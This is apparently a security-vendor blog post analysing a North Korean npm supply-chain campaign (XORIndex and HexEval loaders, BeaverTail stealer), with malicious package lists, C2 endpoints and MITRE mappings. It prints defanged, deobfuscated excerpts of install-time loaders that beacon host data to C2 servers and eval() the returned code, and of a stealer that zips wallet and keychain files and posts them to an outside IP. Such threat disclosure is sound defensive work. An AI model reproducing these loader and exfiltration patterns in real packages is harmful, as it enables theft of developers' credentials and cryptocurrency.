---
title: "Contagious Interview Campaign Escalates With 67 Malicious npm Packages and New Malware Loader"
short_title: "Contagious Interview Escalates With 67 Malicious npm Packages"
date: 2025-07-14 12:00:00 +0000
categories: [Malware, North Korea]
tags: [Contagious Interview, XORIndex, HexEval, BeaverTail, InvisibleFerret, npm, Obfuscation, T1195.002, T1608.001, T1204.002, T1059.007, T1027.013, T1546.016, T1005, T1082, T1083, T1217, T1555.003, T1555.001, T1041, T1105, T1119, T1657]
canonical_url: https://socket.dev/blog/contagious-interview-campaign-escalates-67-malicious-npm-packages
source: Socket
image:
  path: https://cdn.sanity.io/images/cgdhsj6q/production/9338d37b53b8b0cd642a9cdcca19d95d542230e1-1024x1024.png
  alt: "Contagious Interview Campaign Escalates With 67 Malicious npm Packages and New Malware Loader"
description: "North Korean threat actors deploy 67 malicious npm packages using the newly discovered XORIndex malware loader."
---

The Socket Threat Research Team has uncovered a new North Korean software supply chain attack involving a previously unreported malware loader we call XORIndex. This activity is an expansion of the campaign we [reported](https://socket.dev/blog/north-korean-contagious-interview-campaign-drops-35-new-malicious-npm-packages) in June 2025, which deployed the HexEval Loader. In this latest wave, the North Korean threat actors behind the Contagious Interview operation infiltrated the npm ecosystem with 67 malicious packages, collectively downloaded more than 17,000 times. 27 of these packages remain live on the npm registry. We have submitted takedown requests to the npm security team and petitioned for the suspension of the associated accounts.

The full list of packages is provided in the IOCs section of this report. Based on current patterns, we assess that additional packages tied to the XORIndex and HexEval Loader campaigns are likely to surface. The Contagious Interview operation continues to follow a whack-a-mole dynamic, where defenders detect and report malicious packages, and North Korean threat actors quickly respond by uploading new variants using the same, similar, or slightly evolved playbooks.

The HexEval Loader campaign shows no signs of slowing down, as the threat actors continue uploading malicious packages to the npm registry. With the emergence of the XORIndex Loader (named for its use of XOR-encoded strings and index-based obfuscation) they have expanded their tooling with a new loader, also designed to evade detection.

As in the HexEval campaign, the XORIndex Loader collects host metadata, decodes its follow-on script, and, when triggered, fetches and executes BeaverTail — the staple second-stage malware in the North Korean Contagious Interview threat actors' arsenal. BeaverTail, in turn, references InvisibleFerret, a known third-stage backdoor linked to this operation.

The two campaigns now operate in parallel. XORIndex has accumulated over 9,000 downloads in a short window (June to July 2025), while HexEval continues at a steady pace, with more than 8,000 additional downloads across the newly discovered packages.

We expect the North Korean threat actors to reuse existing loaders like HexEval and XORIndex, while introducing new obfuscation techniques and loader variants. Their focus remains on infiltrating software supply chains and targeting developers, job seekers, and individuals they believe possess cryptocurrency or sensitive credentials. As our previous [reporting](https://socket.dev/blog/north-korean-contagious-interview-campaign-drops-35-new-malicious-npm-packages) shows, these well-resourced, financially-motivated, and state-backed threat actors do not hesitate to target smaller organizations and individuals.

![Timeline of HexEval and XORIndex Loader campaigns](https://cdn.sanity.io/images/cgdhsj6q/production/229be48d621d13ed4efef3e3ffb41e542add2cf9-1802x1220.png)
_Timeline of HexEval and XORIndex Loader campaigns showing parallel waves of malicious npm package deployments by North Korean threat actors from April to July 2025. This latest wave includes 67 previously unreported packages: 39 new HexEval Loader and 28 XORIndex Loader packages. Earlier waves: 4 packages in [April 2025](https://socket.dev/blog/lazarus-expands-malicious-npm-campaign-11-new-packages-add-malware-loaders-and-bitbucket) and 35 in [June 2025](https://socket.dev/blog/north-korean-contagious-interview-campaign-drops-35-new-malicious-npm-packages) were detailed in our prior research._

## XORIndex Loader

In the XORIndex Loader campaign, we identified 28 malicious npm packages distributed across 18 npm accounts registered using 15 distinct email addresses. Consistent with the HexEval Loader campaign, the malware relies on hardcoded command and control (C2) infrastructure delivering the `/api/ipcheck` callback. The five known endpoints include:

1. `https://soc-log[.]vercel[.]app/api/ipcheck`
1. `https://1215[.]vercel[.]app/api/ipcheck`
1. `https://log-writter[.]vercel[.]app/api/ipcheck`
1. `https://process-log-update[.]vercel[.]app/api/ipcheck`
1. `https://api[.]npoint[.]io/1f901a22daea7694face` (a likely initial configuration fetch).

Package-naming patterns (e.g., `vite-*`, `*-log*`), the presence of BeaverTail malware, and references to the InvisibleFerret backdoor link the XORIndex campaign to [earlier](https://socket.dev/blog/lazarus-strikes-npm-again-with-a-new-wave-of-malicious-packages) Contagious Interview operations we previously [documented](https://socket.dev/blog/lazarus-expands-malicious-npm-campaign-11-new-packages-add-malware-loaders-and-bitbucket).

The following commented excerpt from the deobfuscated [`eth-auditlog`](https://socket.dev/npm/package/eth-auditlog/files/1.0.1/lib/private/prepare-writer.js) package demonstrates a typical instance of the XORIndex Loader.

```javascript
// Dependencies and utilities
const axios = require("axios");
const os    = require("os");
const publicIp = (await import("public-ip")).default;

// XOR-decode function for obfuscated strings (simplified)
function xorDecode(hexStr) { /* … */ }

// Collects local telemetry (host/user/IP/geo/platform)
async function gatherInfo() {
  const ip  = await publicIp.v4();                        // External IP
  const geo = (await axios.get(`http://ip-api.com/json/${ip}`)).data;
																												  // IP-based geolocation
  return {
    host: os.hostname(),                                  // System hostname
    user: os.userInfo().username,                         // Current OS username
    ip,
    location: geo,                                        // Geolocation metadata
    platform: os.platform()                               // OS identifier
  };
}

// Sends beacon and executes threat actor-supplied JavaScript payloads
module.exports = async function writer() {
  const info    = await gatherInfo();
  const version = process.env.npm_package_version;

  // POST telemetry to C2 endpoint (defanged) and execute returned payloads
  axios.post("https://log-writter[.]vercel[.]app/api/ipcheck",
             { ...info, version })
       .then(res => {
         eval(res.data.s1);            // Execute primary threat actor's payload
         eval(res.data.s2);            // Execute optional secondary payload
       })
       .catch(() => console.log("write f callback error");

};
```

Upon installation, `eth-auditlog` collects local host telemetry, including hostname, current username, OS type, external IP address, basic geolocation, and the package's version, then exfiltrates this data to a hardcoded C2 (`https://log-writter[.]vercel[.]app/api/ipcheck`) endpoint. It subsequently executes arbitrary JavaScript code via `eval()`, loading the second-stage malware BeaverTail, which contains references to the third-stage backdoor InvisibleFerret. The malicious code is platform-agnostic, functioning across Windows, macOS, and Linux, but specifically targets the `Node.js` ecosystem, primarily developers installing npm packages.

## BeaverTail

The second-stage malware delivered by the XORIndex Loader via the `eth-auditlog` package is BeaverTail — the hallmark payload of the North Korean Contagious Interview operations. It scans for dozens of known desktop wallet directories and browser extension paths, archives the collected data, and exfiltrates it to a hardcoded IP-based HTTP endpoint. Several string constants in the code match wallet and extension identifiers previously attributed to BeaverTail. BeaverTail downloads additional payloads, such as the InvisibleFerret backdoor, using filenames like `p.zi` or `p2.zip`.

The following deobfuscated, defanged, and commented excerpt illustrates the BeaverTail second-stage malware that is executed after installation of the `eth-auditlog` package.

```javascript
// Wallet / Key store targets
const WALLET_IDS = [
  'nkbihfbeog',      // MetaMask browser extension ID
  'iijedngplf',      // Coinbase Wallet extension ID
  'cgndfolcbk',      // Phantom (Chrome) extension ID
  'bohpjbbldc',      // TronLink extension ID
  // … 46 more IDs …
];

const FILE_PATTERNS = [
  '/Library/Application Support/Exodus/',         // Exodus wallet config
  '/Library/Application Support/BraveSoftware/',  // Brave browser profiles
  '/.config/solana/solana_id.json',               // Solana CLI keypair
  'Login.keychain',                               // macOS system keychain file
  // …
];

// File collection and exfiltration
function harvest() {                               // Primary execution routine
  const tmpZip = path.join(os.tmpdir(), 'p2.zip');
  const zip    = new AdmZip();                     // Dependency for archiving

  scanAndAdd(zip, WALLET_IDS, FILE_PATTERNS);      // Search and match files

  zip.writeZip(tmpZip);

  // Exfiltrate collected archive via HTTP POST
  return axios.post('http://144[.]217[.]86[.]88/uploads',     // Hardcoded C2
                    fs.createReadStream(tmpZip),
                    { headers: { 'Content-Type': 'application/zip' } });
}

// Optional payload fetch and execution
axios.get('http://144[.]217[.]86[.]88/download')     // Fetch remote payload
     .then(r => Function(r.data)())                  // Execute via Function
```

The malware enumerates nearly 50 wallet paths (e.g. Exodus, MetaMask, Phantom, Keplr, and TronLink) and inspects user profiles for Chromium- and Gecko-based browsers (Brave, Chrome, Firefox, Opera, Edge) to locate extension storage directories. It searches for sensitive files such as `*.ldb`, `RTCDataChannel`, `keychain-db`, and seed files matching `*.json` patterns. Collected data is archived into `p2.zip` using the embedded `adm-zip` module and written to the system's temporary directory. The archive is exfiltrated via HTTP POST to `http://144[.]217[.]86[.]88/uploads`. Exfiltrated contents include wallet databases, browser extension local storage, macOS keychain credentials, Solana IDs, and wallet-related JSON files. On successful upload, the archive is deleted. The malware then attempts to fetch a third-stage malware from the same host and executes it in memory using `Function()`. This behavior aligns with the established BeaverTail to InvisibleFerret execution chain.

## XORIndex Loader Evolution

### `postcss-preloader` — First-Generation XORIndex Loader

We identified earlier variants of the XORIndex Loader likely used for testing, which lacked obfuscation and offered limited or no host reconnaissance capabilities. One such example is [`postcss-preloader`](https://socket.dev/npm/package/postcss-preloader/overview/0.0.1) — an aptly named loader prototype.

During installation, `postcss-preloader` silently contacts a hardcoded C2 endpoint and executes any JavaScript code returned by the server. Unlike later XORIndex Loader variants, it omits string obfuscation, host metadata collection, and endpoint rotation. Yet, it still provides the threat actors with full remote code execution, highlighting the foundational capabilities of this malware loader.

The following commented and defanged [excerpt](https://socket.dev/npm/package/postcss-preloader/files/0.0.1/lib/private/prepare-writer.js) from the `postcss-preloader` package demonstrates the first prototype version of the XORIndex Loader.

```javascript
"use strict";

const axios = require("axios");         // Sends HTTP requests
const os = require("os");               // Unused (likely decoy)

require("dotenv").config();             // Loads .env (optional)

// Postinstall callback
const writer = async () => {
    try {
        const version = process.env.npm_package_version;

        // Beacon to threat actor's C2
        axios
            .post("https://soc-log[.]vercel[.]app/api/ipcheck", { version })
            .then((r) => {
                eval(r.data.model);     // Executes server-sent JS code
            });
    } catch (error) {
        // Silent fail
    }
};

module.exports = writer;               // Auto-invoked postinstall entry
```

### `js-log-print` — Second-Generation XORIndex Loader

[`js-log-print`](https://socket.dev/npm/package/js-log-print/overview/1.0.0) retains the same basic post-install remote code execution behavior as the initial `postcss-preloader` version but introduces rudimentary host reconnaissance, attempting to collect the hostname, username, external IP, geolocation, and OS type. However, due to a bug in the external IP retrieval logic, the `ip` and `location` fields are typically undefined or null. Unlike the fully developed XORIndex loader, it lacks string obfuscation and multi-endpoint rotation.

The following commented and defanged [excerpt](https://socket.dev/npm/package/js-log-print/files/1.0.0/lib/private/prepare-writer.js) from the `js-log-print` package demonstrates a transitional stage of the XORIndex Loader.

```javascript
"use strict";

const axios = require("axios");           // HTTP client for API calls
const os = require("os");                 // Access to system info

require("dotenv").config();               // Load environment variables

// Attempts to get external IP (BUG: returns nothing)
async function geuicp() {
    const publicIp = await import("public-ip");
    const ip = await publicIp.publicIpv4();  // IP fetched but never returned
}

// Collects system telemetry
async function genfo() {
    try {
        const hoame = os.hostname();             // Hostname
        const uame  = os.userInfo().username;    // Username
        const ip    = await geuicp();            // External IP (fails)
        const location = await getP(ip);         // Country
        const sype  = os.type();                 // OS type

        return { hoame, ip, location, uame, sype };
    } catch (error) {}
}

// Performs IP geolocation lookup
async function getP(ip) {
    try {
        const response = await axios.get(`https://ipapi.co/${ip}/json/`);
        return response.data.country_name;
    } catch (error) {
        return null;
    }
}

// Sends host data to C2 and executes returned code
const writer = async () => {
    try {
        const synfo = await genfo();                       // Gather system data
        const version = process.env.npm_package_version;   // npm package version

        axios
            .post("https://log-writter[.]vercel[.]app/api/ipcheck", { ...synfo, version })                                          // Beacon to C2
            .then((r) => {
                eval(r.data.model);                // Execute threat actor's code
            });
    } catch (error) {}
};

module.exports = writer;  // Exported as postinstall entry
```

### `dev-filterjs` — Third-Generation XORIndex Loader

[`dev-filterjs`](https://socket.dev/npm/package/dev-filterjs/overview/1.0.5) introduces the threat actors' first use of string-level obfuscation (ASCII buffer decoded via `TextDecoder`) while retaining the same post-install beacon-and-eval pattern. Reconnaissance logic from the second prototype remains and now successfully transmits the external IP and country data.

The following commented and defanged [excerpt](https://socket.dev/npm/package/dev-filterjs/files/1.0.5/lib/private/prepare-writer.js) from the `dev-filterjs` package demonstrates the first use of string-level obfuscation in the XORIndex Loader.

```javascript
"use strict";

const axios = require("axios");
const os = require("os");
require('dotenv').config(); // Load environment variables

// Returns external IP (used for geo lookup)
async function geuicp() {
    const publicIp = await import('public-ip');
    return publicIp.publicIpv4();
}

// Collects basic system telemetry
async function genfo() {
    try {
        const hoame = os.hostname();              // Hostname
        const uame = os.userInfo().username;      // Username
        const ip = await geuicp();                // External IP
        const location = await getP(ip);          // Country name
        const sype = os.type();                   // OS type
        return { hoame, ip, location, uame, sype };
    } catch (error) {
        console.error('Error collecting telemetry:', error);
        throw error;
    }
}

// Maps IP to country using ipapi.co
async function getP(ip) {
    try {
        const response = await axios.get(`https://ipapi.co/${ip}/json/`);
        return response.data.country_name;
    } catch (error) {
        console.error('Geo lookup failed:', error.message);
        return null;
    }
}

// Main loader logic (runs automatically post-install)
(async () => {
    try {
        // Decode hardcoded C2 URL
        const uint8Array = new Uint8Array([
      104, 116, 116, 112, 115, 58, 47, 47, 108, 111, 103, 45, 119, 114, 105, 116,
      116, 101, 114, 46, 118, 101, 114, 99, 101, 108, 46, 97, 112, 112, 47, 97,
      112, 105, 47, 105, 112, 99, 104, 101, 99, 107
        ]);
        const decodeURL = new TextDecoder().decode(uint8Array);

        const version = "0.3.2";
        const synfo = await genfo(); // Gather telemetry

        // Send beacon to C2 and execute returned JS payload
        axios.post(decodeURL, { ...synfo, version })
             .then((r) => {
                 eval(r.data.model); // Execute threat actor-supplied code
             });
    } catch (error) {
        // Silently fail
    }
})();

// Exported only for reuse/debug purposes
module.exports = genfo;
```

The XORIndex Loader exhibits a deliberate and rapid evolution from proof-of-concept to fully featured malware loader. The initial `postcss-preloader` was a bare-bones remote code execution loader with no obfuscation or host profiling. The second prototype, `js-log-print`, introduced rudimentary reconnaissance capabilities though it remained unobfuscated. The third iteration, `dev-filterjs`, marked the threat actors' first use of string obfuscation via ASCII buffers and TextDecoder. In contrast, the latest XORIndex Loader variants incorporate XOR-based string hiding, multi-endpoint C2 rotation, host profiling, and dual `eval()` execution paths. Across all versions, the threat actors consistently reuse a shared C2 infrastructure hosted on Vercel under the `/api/ipcheck` path.

This progression reflects the North Korean Contagious Interview threat actors' ongoing investment in stealthier, more resilient software supply chain malware; moving from simple prototypes to modular loaders capable of full system compromise.

![Socket AI Scanner analysis of cronek package](https://cdn.sanity.io/images/cgdhsj6q/production/b4266bda836634dd81f28885dd5b02df99682372-709x691.png)
_Socket's AI scanner includes contextual analysis of the latest XORIndex Loader variant found in the malicious `cronek` package._

![Obfuscated code in the cronek package](https://cdn.sanity.io/images/cgdhsj6q/production/c7ec5d82a12f6c6ad45dd91a19a8c338bc698a74-1563x521.png)
_Socket's view of the obfuscated code in the `cronek` package._

## Outlook and Recommendations

Contagious Interview threat actors will continue to diversify their malware portfolio, rotating through new npm maintainer aliases, reusing loaders such as HexEval Loader and malware families like BeaverTail and InvisibleFerret, and actively deploying newly observed variants including XORIndex Loader.

Defenders should expect continued iterations of these loaders across newly published packages, often with slight variations to evade detection. The threat actors' consistent use of legitimate infrastructure providers like Vercel for C2 lowers operational overhead and may influence similar adoption by other APTs or cybercriminal groups. Evasive methods such as memory-only execution and obfuscation will likely increase, complicating detection and incident response.

Security teams should treat these incidents as persistent, evolving threats. Developers, particularly those in DevOps, open source, or infrastructure engineering roles, remain prime targets due to their elevated access and trust within the ecosystem. Proactive supply chain defense must become a standard part of secure software development.

Socket equips organizations to defend against this evolving threat. The [Socket GitHub App](https://socket.dev/features/github) enables real-time pull request scanning to catch malicious dependencies before they are merged. The [Socket CLI](https://socket.dev/features/cli) flags suspicious behavior during `npm install`, giving immediate visibility into risk. And the [Socket browser extension](https://chromewebstore.google.com/detail/socket-security/jbcobpbfgkhmjfpjjepkcocalmpkiaop?pli=1) adds security metrics to package pages and search results, helping users identify threats in open source packages before installation.

## Indicators of Compromise (IOCs)

## Malicious npm Packages With XORIndex Loader

1. [`vite-meta-plugin`](https://socket.dev/npm/package/vite-meta-plugin) (live at time of publication; removal requested)
1. [`vite-postcss-tools`](https://socket.dev/npm/package/vite-postcss-tools) (live at time of publication; removal requested)
1. [`pretty-chalk`](https://socket.dev/npm/package/pretty-chalk) (live at time of publication; removal requested)
1. [`vite-usageit`](https://socket.dev/npm/package/vite-usageit) (live at time of publication; removal requested)
1. [`ecom-config`](https://socket.dev/npm/package/ecom-config) (live at time of publication; removal requested)
1. [`flowframe`](https://socket.dev/npm/package/flowframe) (live at time of publication; removal requested)
1. [`proc-logger`](https://socket.dev/npm/package/proc-logger) (live at time of publication; removal requested)
1. [`vite-log-handler`](https://socket.dev/npm/package/vite-log-handler) (live at time of publication; removal requested)
1. [`cronek`](https://socket.dev/npm/package/cronek) (live at time of publication; removal requested)
1. [`vite-proc-log`](https://socket.dev/npm/package/vite-proc-log) (live at time of publication; removal requested)
1. [`vite-plugin-enhance`](https://socket.dev/npm/package/vite-plugin-enhance)
1. [`postcss-preloader`](https://socket.dev/npm/package/postcss-preloader)
1. [`vite-logify`](https://socket.dev/npm/package/vite-logify)
1. [`js-log-print`](https://socket.dev/npm/package/js-log-print)
1. [`vite-logging-tool`](https://socket.dev/npm/package/vite-logging-tool)
1. [`dev-filterjs`](https://socket.dev/npm/package/dev-filterjs)
1. [`eth-auditlog`](https://socket.dev/npm/package/eth-auditlog)
1. [`midd-js`](https://socket.dev/npm/package/midd-js)
1. [`flowmark`](https://socket.dev/npm/package/flowmark)
1. [`vitejs-log`](https://socket.dev/npm/package/vitejs-log)
1. [`utx-config`](https://socket.dev/npm/package/utx-config)
1. [`figwrap`](https://socket.dev/npm/package/figwrap)
1. [`springboot-js`](https://socket.dev/npm/package/springboot-js)
1. [`springboot-md`](https://socket.dev/npm/package/springboot-md)
1. [`1imit`](https://socket.dev/npm/package/1imit)
1. [`phlib-config`](https://socket.dev/npm/package/phlib-config)
1. [`middy-js`](https://socket.dev/npm/package/middy-js)
1. [`vite-tsconfig-log`](https://socket.dev/npm/package/vite-tsconfig-log)

### npm Aliases

1. `h96452582`
1. `devin-ta39`
1. `csilvagalaxy`
1. `alisson_dev`
1. `dmytryi`
1. `drgru`
1. `ahmadbahai`
1. `stefanofrick2`
1. `samuelhuggins`
1. `jgod19960520`
1. `monster1117`
1. `marilin`
1. `jasonharry1988`
1. `davidmoberly`
1. `vitalii0021`
1. `rory210`
1. `jasonharry198852`
1. `millos`

### Email Addresses

1. `h96452582@gmail[.]com`
1. `devin.s@gedu[.]demo[.]ta-39[.]com`
1. `csilvagalaxy87@gmail[.]com`
1. `souzaporto800@gmail[.]com`
1. `dmytroputko@gmail[.]com`
1. `drgru854@gmail[.]com`
1. `ahmadbahai07@gmail[.]com`
1. `stefanofrick2@gmail[.]com`
1. `samuelhuggins3@gmail[.]com`
1. `jgod19960520@outlook[.]com`
1. `filip.porter9017@outlook[.]com`
1. `r29728098@gmail[.]com`
1. `vitalii214.ilnytskyi@gmail[.]com`
1. `jasonharry198852@gmail[.]com`
1. `millosmike3@gmail[.]com`

## Malicious npm Packages With HexEval Loader

1. [`nextjs-https-supertest`](https://socket.dev/npm/package/nextjs-https-supertest) (live at time of publication; removal requested)
1. [`nextjs-package-purify`](https://socket.dev/npm/package/nextjs-package-purify) (live at time of publication; removal requested)
1. [`jsonslicer`](https://socket.dev/npm/package/jsonslicer) (live at time of publication; removal requested)
1. [`node-mongo-orm`](https://socket.dev/npm/package/node-mongo-orm) (live at time of publication; removal requested)
1. [`parsing-query`](https://socket.dev/npm/package/parsing-query) (live at time of publication; removal requested)
1. [`tailwind-config-plugin`](https://socket.dev/npm/package/tailwind-config-plugin) (live at time of publication; removal requested)
1. [`nodestream-log`](https://socket.dev/npm/package/nodestream-log) (live at time of publication; removal requested)
1. [`vite-lightparse`](https://socket.dev/npm/package/vite-lightparse) (live at time of publication; removal requested)
1. [`pino-req`](https://socket.dev/npm/package/pino-req) (live at time of publication; removal requested)
1. [`tailwind-base-theme`](https://socket.dev/npm/package/tailwind-base-theme) (live at time of publication; removal requested)
1. [`js-prettier`](https://socket.dev/npm/package/js-prettier) (live at time of publication; removal requested)
1. [`notifier-loggers`](https://socket.dev/npm/package/notifier-loggers) (live at time of publication; removal requested)
1. [`querypilot`](https://socket.dev/npm/package/querypilot) (live at time of publication; removal requested)
1. [`vitejs-plugin-refresh`](https://socket.dev/npm/package/vitejs-plugin-refresh) (live at time of publication; removal requested)
1. [`jsonlis-conf`](https://socket.dev/npm/package/jsonlis-conf) (live at time of publication; removal requested)
1. [`node-mongodb-logger`](https://socket.dev/npm/package/node-mongodb-logger) (live at time of publication; removal requested)
1. [`jsonloggers`](https://socket.dev/npm/package/jsonloggers)
1. [`async-queuelite`](https://socket.dev/npm/package/async-queuelite)
1. [`node-mongoose-orm`](https://socket.dev/npm/package/node-mongoose-orm)
1. [`jsonwebstr`](https://socket.dev/npm/package/jsonwebstr)
1. [`parser-query`](https://socket.dev/npm/package/parser-query)
1. [`node-log-streamer`](https://socket.dev/npm/package/node-log-streamer)
1. [`jsonli-conf`](https://socket.dev/npm/package/jsonli-conf)
1. [`notification-loggers`](https://socket.dev/npm/package/notification-loggers)
1. [`notification-logs`](https://socket.dev/npm/package/notification-logs)
1. [`logs-bind`](https://socket.dev/npm/package/logs-bind)
1. [`jsons-pack`](https://socket.dev/npm/package/jsons-pack)
1. [`reqweaver`](https://socket.dev/npm/package/reqweaver)
1. [`servula`](https://socket.dev/npm/package/servula)
1. [`reqnexus`](https://socket.dev/npm/package/reqnexus)
1. [`velocky`](https://socket.dev/npm/package/velocky)
1. [`flush-plugins`](https://socket.dev/npm/package/flush-plugins)
1. [`jsonlogs`](https://socket.dev/npm/package/jsonlogs)
1. [`jsontostr`](https://socket.dev/npm/package/jsontostr)
1. [`husky-logger`](https://socket.dev/npm/package/husky-logger)
1. [`node-mongodb-orm`](https://socket.dev/npm/package/node-mongodb-orm)
1. [`jsonskipy`](https://socket.dev/npm/package/jsonskipy)
1. [`restpilot`](https://socket.dev/npm/package/restpilot)
1. [`jsonspack-logger`](https://socket.dev/npm/package/jsonspack-logger)

### npm Aliases

1. `denniswinter`
1. `magalhaesbruno236`
1. `backsonblau`
1. `jinping`
1. `rodolfo010813`
1. `david262721`
1. `christacole`
1. `oleksandr522`
1. `hera0204`
1. `hamid1997`
1. `kingxianstar`
1. `daphneyrath`
1. `garner_dev`
1. `alex.c11`
1. `dan436`
1. `jennyjenkins`
1. `david36271`
1. `yoga001`
1. `astro847`
1. `stardev47`
1. `ahmedays`
1. `devcrimson`
1. `derek00144`
1. `devin1571`
1. `stormdev0418`
1. `jinping0822`
1. `davisjosephinewnk`
1. `jaksonas11`
1. `liamnevin`

### Email Addresses

1. `denniswinter727@outlook[.]com`
1. `magalhaesbruno236@gmail[.]com`
1. `jacksonblau11ai@gmail[.]com`
1. `jinping0821@outlook[.]com`
1. `rodolfguerr@gmail[.]com`
1. `david262721@outlook[.]com`
1. `chulovskaolena@outlook[.]com`
1. `oleksandrkazadaiev522@gmail[.]com`
1. `hera19970204@outlook[.]com`
1. `zeus19970204@outlook[.]com`
1. `imanwdr30@hotmail[.]com`
1. `scarlet112603@outlook[.]com`
1. `garnerbrandy1230@gmail[.]com`
1. `alexandercruciata11@gmail[.]com`
1. `danxeth436@gmail[.]com`
1. `jennyjenkins783@gmail[.]com`
1. `david36271@outlook[.]com`
1. `rkupriyanof@gmail[.]com`
1. `vallierhilaire@gmail[.]com`
1. `willsuccess47@gmail[.]com`
1. `ahmedali06091@gmail[.]com`
1. `c258789456@gmail[.]com`
1. `derek00144@gmail[.]com`
1. `devin1571@outlook[.]com`
1. `star712418@gmail[.]com`
1. `jinping0822@outlook[.]com`
1. `davisjosephinewnk807@outlook[.]com`
1. `jaksonas11@outlook[.]com`
1. `hades19910712@outlook[.]com`

## Command and Control (C2) Endpoints

1. `https://soc-log[.]vercel[.]app/api/ipcheck`
1. `https://1215[.]vercel[.]app/api/ipcheck`
1. `https://log-writter[.]vercel[.]app/api/ipcheck`
1. `https://process-log-update[.]vercel[.]app/api/ipcheck`
1. `https://api[.]npoint[.]io/1f901a22daea7694face`
1. `144[.]217[.]86[.]88`

## MITRE ATT&CK Techniques

- T1195.002 — Supply Chain Compromise: Compromise Software Supply Chain
- T1608.001 — Stage Capabilities: Upload Malware
- T1204.002 — User Execution: Malicious File
- T1059.007 — Command and Scripting Interpreter: JavaScript
- T1027.013 — Obfuscated Files or Information: Encrypted/Encoded File
- T1546.016 — Event Triggered Execution: Installer Packages
- T1005 — Data from Local System
- T1082 — System Information Discovery
- T1083 — File and Directory Discovery
- T1217 — Browser Information Discovery
- T1555.003 — Credentials from Password Stores: Credentials from Web Browsers
- T1555.001 — Credentials from Password Stores: Keychain
- T1041 — Exfiltration Over C2 Channel
- T1105 — Ingress Tool Transfer
- T1119 — Automated Collection
- T1657 — Financial Theft
